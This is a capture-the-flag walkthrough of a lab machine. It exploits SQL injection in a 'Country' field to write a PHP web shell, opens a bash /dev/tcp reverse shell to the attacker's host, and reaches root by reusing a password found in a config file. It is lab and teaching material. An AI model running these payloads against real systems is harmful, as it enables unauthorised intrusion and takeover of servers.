## Reconnaissance
### Initial Port Scan
```bash
sudo ./nmapAutomator.sh 10.10.11.116 All
```
* Result

![1_OpenPorts](https://user-images.githubusercontent.com/53956303/133705335-9cb77494-4c56-4acd-b7e3-fa08ead4b635.jpg)
![2](https://user-images.githubusercontent.com/53956303/133705384-fb05223b-9070-4e5e-9cc7-f07df1fb62ec.png)
### Vuln scan result from NmapAutomator
![4](https://user-images.githubusercontent.com/53956303/133705418-f74e505c-10c6-44d9-99bf-80fe936cc8c8.png)
## Enumeration
## Port 80
![3](https://user-images.githubusercontent.com/53956303/133705401-3609dd45-76de-485a-8b69-6c9db50742ca.png)
### Enumerate the panel
* Adding a command after a user does not work on this panel

![5](https://user-images.githubusercontent.com/53956303/133705426-7c79e6b2-95f6-408a-a43f-856dd004f761.png)
### Capture the traffic to identify if the "Country" can be used for exploitation
* Since the Country is a drop box type, capture the traffic to see if it can be used
    * Since there has "Country" parameter, try to add a single quote to identify if SQL injection works
    
![6](https://user-images.githubusercontent.com/53956303/133705441-16835b3d-538a-4b6e-a6bf-69227d54ec41.png)
* From the Response, a static user cookie(Set-Cookie) is found

![7](https://user-images.githubusercontent.com/53956303/133705457-12635826-2b94-49dd-b36f-027c6dd6b445.png)
### Try to inject the user cookie on the web site
* When the user cookie is injected using the Firefox inspector, an error message is found

![8](https://user-images.githubusercontent.com/53956303/133705467-14503fcf-5c47-437a-968c-9bf9ce8f8102.png)
* It means that this page is vulnerable to SQL injection

### Identify the column number
* Use an Uniton command after Country, identify the column number
    * Use the same method above
#### Test for 1 column
```sql
Brazil' union select 1;-- -
```
* Result

![9](https://user-images.githubusercontent.com/53956303/133705487-4a867b15-3913-45a8-b9ce-4073e07de68c.png)
#### Test for 2 columns
```sql
Brazil' union select 1,2;-- -
```
* It returns an error message

![10](https://user-images.githubusercontent.com/53956303/133705502-4763ffb4-5c58-4ce1-8c81-f205f105d695.png)
* It means that this table has only one column

## Exploitation
### Inject a PHP command "cmd.php" using SQL injection
* Inject the cmd.php into the defaul Linux web directory (Where the `account.php` also stored)
```sql
Brazil' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/shell.php';-- -
```
![11](https://user-images.githubusercontent.com/53956303/133705514-9623526f-f1fd-48c7-a3b6-5c47f30b1316.png)
* From the result, it returns an error message since the command does not want any printed return result

![12](https://user-images.githubusercontent.com/53956303/133705521-129b7b45-73bb-449f-8b47-ce1304bb793b.png)
### Test the cmd.php
* Using Curl to identify if the `shell.php` is successfully installed on the target machine's default web directory
```bash
curl http://10.10.11.116/shell.php?cmd=id
```
* from the result, a successful result is given

![13](https://user-images.githubusercontent.com/53956303/133705534-eb727429-bc20-4be2-9a3b-91cc2cfd77e0.png)
### Getting an initial shell
#### Open a Netcat Listener on Kali
```bash
sudo nc -lnvp 4444
```
#### Use `/bin/bash` to trigger a reverse shell
* use `/bin/bash` to get a reverse shell
    * Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQ0NCAwPiYxJw) to URL encode
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'
```
![14](https://user-images.githubusercontent.com/53956303/133705545-eeef1cde-c5bf-49d5-9ee2-a8e56054b20b.png)
* Use `Curl` to trigger the reverse shell
```bash
curl http://10.10.11.116/shell.php?cmd=%2Fbin%2Fbash%20%2Dc%20%27%2Fbin%2Fbash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E17%2F4444%200%3E%261%27
```
* As a result, a reverse shell as "www-data" is open
    * since there has no python installed, tty shell cannot be opened using python
    
![15](https://user-images.githubusercontent.com/53956303/133705557-a73ca640-aafc-459a-a0cc-d0d4c25b2e50.png)
## Privilege Escalataion
### Local Enumeration
* From `/var/www/html/config.php`, credentials for a Database is found

![16](https://user-images.githubusercontent.com/53956303/133705579-adfafcfa-9b96-4939-b03e-ed35a4c878e9.png)
### Try to login as root
* Since there has no other user and log in to mysql does not work, try to login as root
```bash
su -
#password: uhc-9qual-global-pw
```
* As a result, a root shell is open. (In a docker container)

![17](https://user-images.githubusercontent.com/53956303/133705587-dab1f539-cece-4fc4-a02d-4bf03aa2acfe.png)
